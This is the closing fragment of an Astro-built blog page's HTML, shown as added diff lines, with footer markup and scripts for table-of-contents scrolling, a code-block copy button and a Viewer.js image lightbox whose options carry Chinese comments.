+    </section> --> </div>  <script type="module">function l(){const a=document.querySelectorAll(".toc-list a[data-target]");if(a.length===0)return;a.forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const r=o.getAttribute("data-target"),c=document.getElementById(r);c&&c.scrollIntoView({behavior:"smooth",block:"start"})})});const e=Array.from(a).map(o=>document.getElementById(o.getAttribute("data-target"))).filter(Boolean);function s(){let o="";for(let t=e.length-1;t>=0;t--)if(e[t].getBoundingClientRect().top<=100){o=e[t].id;break}a.forEach(t=>{t.classList.toggle("active",t.getAttribute("data-target")===o)})}s(),window.addEventListener("scroll",s,{passive:!0})}function u(){const a=document.querySelectorAll("pre.astro-code");let e=null;a.forEach(t=>{const r=t.querySelector("code");if(!r)return;const c=document.createElement("div");c.className="code-wrapper",t.parentNode.insertBefore(c,t),c.appendChild(t);const n=document.createElement("button");n.className="copy-button",n.innerHTML=`
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <rect x="9" y="9" width="13" height="13" rx="2"></rect>
+        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+      </svg>
+      <span>Copy</span>
+    `,c.appendChild(n),c.addEventListener("click",i=>{i.target.closest(".copy-button")||(document.querySelectorAll(".code-wrapper").forEach(d=>d.classList.remove("show-copy")),c.classList.add("show-copy"))}),n.addEventListener("click",async()=>{try{await navigator.clipboard.writeText(r.innerText),e&&e!==n&&o(e),s(n),e=n}catch{n.querySelector("span").textContent="Failed"}})}),document.addEventListener("click",t=>{t.target.closest(".code-wrapper")||document.querySelectorAll(".code-wrapper").forEach(r=>r.classList.remove("show-copy"))}),document.addEventListener("copy",()=>{e&&(o(e),e=null)});function s(t){t.classList.add("success"),t.querySelector("span").textContent="Copied!"}function o(t){t.classList.remove("success"),t.querySelector("span").textContent="Copy"}}window.addEventListener("DOMContentLoaded",()=>{l(),u()});</script>  </div> </div> </div> <footer id="footer" role="contentinfo">
+&copy; 2026 <a href="/">yulian Lab</a>.
+    由 <a href="https://astro.build">Astro</a> 驱动.
+</footer>  <link rel="stylesheet" href="/viewer/viewer.min.css"> <script src="/viewer/viewer.min.js"></script> <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const postContent = document.querySelector('.post-content');
+        
+        if (postContent && postContent.querySelectorAll('img').length > 0) {
+            new Viewer(postContent, {
+                inline: false,      // 模态框模式（点击图片弹出）
+                button: true,       // 显示右上角关闭按钮
+                navbar: true,       // 显示底部缩略图导航栏（多图时可以像相册一样切换）
+                title: true,        // 显示图片标题（自动读取 Markdown 中图片的 alt 描述）
+                toolbar: true,      // 显示底部工具栏（包含放大、缩小、1:1、旋转、翻转等按钮）
+                tooltip: true,      // 缩放时显示百分比提示
+                movable: true,      // 允许鼠标拖拽移动图片
+                zoomable: true,     // 允许滚轮缩放
+                rotatable: true,    // 允许旋转图片
+                scalable: true,     // 允许翻转图片
+                transition: true,   // 开启 CSS3 平滑过渡动画
+                fullscreen: true,   // 允许全屏播放
+                keyboard: true,     // 支持键盘快捷键（ESC退出，左右方向键切换图片）
+                
+                zIndex: 9999,
+                zIndexInline: 9999
+            });
+        }
+    });
+</script> </body> </html>
